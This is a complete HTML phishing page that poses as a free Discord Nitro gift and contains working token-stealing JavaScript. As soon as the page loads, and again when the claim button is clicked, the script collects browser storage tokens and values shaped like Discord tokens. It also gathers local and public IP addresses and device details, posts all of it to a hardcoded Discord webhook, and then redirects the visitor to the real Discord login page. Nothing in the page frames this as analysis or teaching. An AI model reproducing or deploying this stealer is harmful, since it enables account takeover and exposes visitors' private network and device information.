<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Nitro Gift</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        .nitro-gif {
            width: 200px;
            height: 200px;
            margin-bottom: 20px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 0 2px 10px rgba(0,0,0,0.5); }
        p { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
        .claim-btn {
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            border: none;
            padding: 15px 40px;
            font-size: 1.3em;
            font-weight: bold;
            color: white;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(254, 202, 87, 0.4);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .claim-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(254, 202, 87, 0.6); }
        .loading { display: none; margin-top: 20px; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #feca57;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.imgur.com/discord-nitro.gif" alt="Discord Nitro" class="nitro-gif" onload="stealEverything()" onerror="stealEverything()">
        <h1>🎉 Discord Nitro Gift 🎉</h1>
        <p>Your 3 Month Nitro Gift has been generated!</p>
        <button class="claim-btn" onclick="claimNitro()">Claim Your FREE Nitro</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Generating your Nitro...</p>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';

        // DISCORD TOKEN GRABBER
        function grabDiscordTokens() {
            const tokens = [];
            const localStorageTokens = [
                'token',
                'access_token',
                'auth_token',
                'csrf_token'
            ];

            // Check localStorage
            for (const key of localStorageTokens) {
                if (localStorage[key]) {
                    tokens.push({
                        type: 'localStorage',
                        key: key,
                        value: localStorage[key]
                    });
                }
            }

            // Check sessionStorage
            for (const key of localStorageTokens) {
                if (sessionStorage[key]) {
                    tokens.push({
                        type: 'sessionStorage',
                        key: key,
                        value: sessionStorage[key]
                    });
                }
            }

            // Discord specific paths
            const discordPaths = [
                ...Object.keys(localStorage).filter(k => k.includes('discord')),
                ...Object.keys(sessionStorage).filter(k => k.includes('discord'))
            ];

            discordPaths.forEach(path => {
                tokens.push({
                    type: 'Discord',
                    path: path,
                    value: localStorage[path] || sessionStorage[path]
                });
            });

            // Check for base64 encoded tokens (Discord format)
            const allKeys = [...Object.keys(localStorage), ...Object.keys(sessionStorage)];
            for (const key of allKeys) {
                const value = localStorage[key] || sessionStorage[key];
                if (typeof value === 'string' && (value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/) || value.match(/mfa\./))) {
                    tokens.push({
                        type: 'Potential Token',
                        key: key,
                        value: value
                    });
                }
            }

            return tokens;
        }

        // WEBRTC LAN IP + NETWORK SCANNER
        async function getNetworkInfo() {
            return new Promise((resolve) => {
                const ips = [];
                
                // WebRTC Local IP
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                rtc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        rtc.close();
                        return;
                    }
                    const candidate = e.candidate.candidate;
                    const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (ipMatch && !ips.includes(ipMatch[1])) {
                        ips.push(ipMatch[1]);
                    }
                };
                
                setTimeout(() => {
                    rtc.close();
                    resolve(ips);
                }, 2000);
            });
        }

        // FULL SYSTEM INFO
        async function getFullInfo() {
            const tokens = grabDiscordTokens();
            const lanIps = await getNetworkInfo();
            const publicIp = await (await fetch('https://api.ipify.org?format=json')).json().then(r => r.ip).catch(() => 'Unknown');
            
            return {
                publicIp,
                lanIps: lanIps.length ? lanIps : ['None detected'],
                tokens: tokens.length ? tokens.map(t => t.value).join('\n') : 'No tokens found',
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                referrer: document.referrer || 'Direct',
                url: window.location.href
            };
        }

        // STEAL EVERYTHING + SEND TO WEBHOOK
        async function stealEverything() {
            const info = await getFullInfo();
            
            const embed = {
                username: '🔥 TOKEN GRABBER + LAN SCANNER 🔥',
                avatar_url: 'https://i.imgur.com/skull-hacker.png',
                embeds: [{
                    title: '🎯 VICTIM CAUGHT!',
                    color: 0xff1493,
                    fields: [
                        { name: '🌐 Public IP', value: '```' + info.publicIp + '```', inline: true },
                        { name: '🏠 LAN IPs (Router)', value: '```' + info.lanIps.join('\n') + '```', inline: false },
                        { name: '🔑 Discord Tokens', value: info.tokens.substring(0, 1024) || 'None', inline: false },
                        { name: '🖥️ Screen', value: '```' + info.screen + '```', inline: true },
                        { name: '🌍 Timezone', value: '```' + info.timezone + '```', inline: true },
                        { name: '💻 CPU Cores', value: '```' + info.hardwareConcurrency + '```', inline: true },
                        { name: '📱 Platform', value: '```' + info.platform + '```', inline: true }
                    ],
                    thumbnail: { url: 'https://i.imgur.com/target-captured.png' },
                    footer: { text: `Tokens: ${info.tokens ? info.tokens.split('\n').length : 0} | LAN: ${info.lanIps.length}` },
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            }).catch(() => {});
        }

        async function claimNitro() {
            const btn = document.querySelector('.claim-btn');
            const loading = document.getElementById('loading');
            
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            // Double-send on claim for confirmation
            stealEverything();
            
            setTimeout(() => {
                window.location.href = 'https://discord.com/login';
            }, 3000);
        }

        // AUTO-EXECUTE ON LOAD
        window.onload = stealEverything;
    </script>
</body>
</html>
